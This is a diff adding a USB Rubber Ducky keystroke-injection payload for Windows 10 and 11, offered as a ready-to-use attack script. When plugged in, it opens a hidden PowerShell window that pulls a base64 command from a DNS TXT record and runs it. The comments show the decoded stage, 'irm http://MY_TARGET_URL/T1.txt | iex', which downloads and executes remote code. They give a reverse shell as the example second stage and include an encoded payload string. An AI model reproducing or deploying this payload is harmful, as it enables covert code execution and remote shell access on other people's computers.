@@ -1,1 +1,38 @@
+REM     Title: DNS-TXT-CommandInection
+REM     Author: Nate
+REM     Description: A usb rubber ducky payload that leverages DNS TXT records to perform command injection.
+REM     Windows Powershell is the CLI used by the payload. Replace the DNS TXT record for your domain with
+REM     the base64 encoded payload you have. See README.md for more details on converting your payload to base64
+REM 	and an example of creating your DNS TXT record in AWS Route53 service.
+REM     Target: Windows 10, 11
+REM     Props: Hak5, Darren Kitchen, Korben
+REM     Version: 1.0
+REM     Category: Execution
+
+REM     CONFIGURATION
+REM     REQUIRED A domain with the ability to manipulate the DNS TXT records.
+REM     REQUIRED Web Server hosting the payload. In this example, python3 http.server was used to host a 
+REM     reverseshell.
+REM     REQUIRED - Provide URL used for Example
+DEFINE  #MY_TARGET_URL example.com
+REM     Example: powershell /w 1 $a=(resolve-dnsname MY_TARGET_URL TXT).strings;powershell -e $a
+REM     Example of Decoded payload: "irm http://MY_TARGET_URL/T1.txt | iex"
+
+REM     NOTES: No base64 can be used as an alternative by replacing "$a=",";powershell -e $a" with just "|iex"
+REM     for the STRING payload below. Examples of the decoded command and encoded command are shown below to put 
+REM     into DNS TXT record.
+REM     Decoded: "irm http://MY_TARGET_URL/T1.txt | iex"
+REM     Encoded: "aQByAG0AIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAFQAMQAuAHQAeAB0ACAAfAAgAGkAZQB4AA=="
+
+REM     ShoutOut: powershell reverse shell one-liner by Nikhil SamratAshok Mittal @samratashok. See link below.
+REM     https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+REM     The link below has the Powershell script to convert your payloads to Base64.
+REM     https://	
+
+DELAY 1000 
+GUI r
+DELAY 1000
+STRING powershell /w 1 $a=(resolve-dnsname MY_TARGET_URL TXT).strings;powershell -e $a
+DELAY 500
+ENTER
 
